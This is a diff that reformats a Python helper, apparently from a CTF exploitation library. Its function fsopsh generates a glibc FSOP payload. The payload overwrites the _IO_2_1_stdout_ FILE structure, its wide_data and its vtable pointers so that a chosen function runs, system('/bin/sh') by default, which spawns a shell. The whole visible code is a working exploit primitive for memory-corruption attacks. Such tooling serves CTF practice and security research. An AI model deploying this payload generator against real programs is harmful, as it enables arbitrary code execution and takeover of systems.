@@ -36,13 +36,16 @@ SEEK = 0x80
 CLOSE = 0x88
 STAT = 0x90
 SHOWMANYC = 0x98
-IMBUE = 0xa0
+IMBUE = 0xA0
 
-def fsopsh(func=None, arg=b"/bin/sh\0", file=None, trigger=XSPUTN, lock=None, chain=None):
+
+def fsopsh(
+    func=None, arg=b"/bin/sh\0", file=None, trigger=XSPUTN, lock=None, chain=None
+):
     r"""fsopsh(func=None, arg=b"/bin/sh\0", file=None, trigger=XSPUTN, lock=None) -> bytes
 
     Generate a fsop payload to call a function (usually system("/bin/sh"))
-    
+
     Arguments:
         func(int): Address of the function to be called, libc's system by default
         arg(bytes): First argument of the call, /bin/sh by default
@@ -51,21 +54,25 @@ def fsopsh(func=None, arg=b"/bin/sh\0", file=None, trigger=XSPUTN, lock=None, ch
         lock(int): Value to put as lock (an empty zone), file+0x800 by default
     """
     hlp._require_ctx()
-    if  hlp.pwnctx.elf.bits != 64:
+    if hlp.pwnctx.elf.bits != 64:
         raise NotImplementedError()
 
     file = file or hlp.pwnctx.libc.sym["_IO_2_1_stdout_"]
     lock = lock or file + 0x800
     func = func or hlp.pwnctx.libc.sym.system
 
-    return flat({
-        0x00: [0x3b01010101010101, arg],
-        0x68: chain if chain else 0x0,
-        0x78: -1,
-        0x88: lock, # empty zone as lock
-        0x90: -1,
-        0xa0: file, # wide_data
-        0xd0: func,
-        0xd8: hlp.pwnctx.libc.sym["_IO_wfile_jumps"] - (trigger - OVERFLOW), # vtable
-        0xe0: file + (0xd0 - 0x68), # wide_data->vtable,
-    }, filler=b"\0")
+    return flat(
+        {
+            0x00: [0x3B01010101010101, arg],
+            0x68: chain if chain else 0x0,
+            0x78: -1,
+            0x88: lock,  # empty zone as lock
+            0x90: -1,
+            0xA0: file,  # wide_data
+            0xD0: func,
+            0xD8: hlp.pwnctx.libc.sym["_IO_wfile_jumps"]
+            - (trigger - OVERFLOW),  # vtable
+            0xE0: file + (0xD0 - 0x68),  # wide_data->vtable,
+        },
+        filler=b"\0",
+    )
